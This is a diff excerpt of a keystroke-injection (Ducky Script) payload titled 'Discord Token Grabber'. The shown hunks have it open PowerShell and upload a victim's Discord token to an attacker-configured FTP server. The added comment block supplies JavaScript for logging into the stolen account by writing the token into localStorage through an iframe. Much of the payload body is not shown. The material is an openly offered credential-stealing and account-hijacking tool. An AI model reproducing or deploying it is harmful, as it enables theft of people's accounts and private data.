@@ -1,9 +1,21 @@
 REM Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
-REM Discord Token Grabber (FTP)
+REM Discord Token Grabber
 
 REM !! CHANGES REQUIRED !!
 REM <FTP_URL> - FTP server to upload to
 REM Credentials if anonymous is not enabled
+
+REM Use the token:
+REM function login(token) {
+REM setInterval(() => {
+REM document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
+REM }, 50);
+REM setTimeout(() => {
+REM location.reload();
+REM }, 2500);
+REM }
+
+REM login('<TOKEN>')`
 
 DEFAULTDELAY 300
 
@@ -57,7 +69,7 @@ STRING powershell
 ENTER
 DELAY 1000
 
-REM Upload the token to a FTP server
+REM Upload the token to FTP server
 DEFAULTDELAY 50
 STRING $81g =
 CTRL v
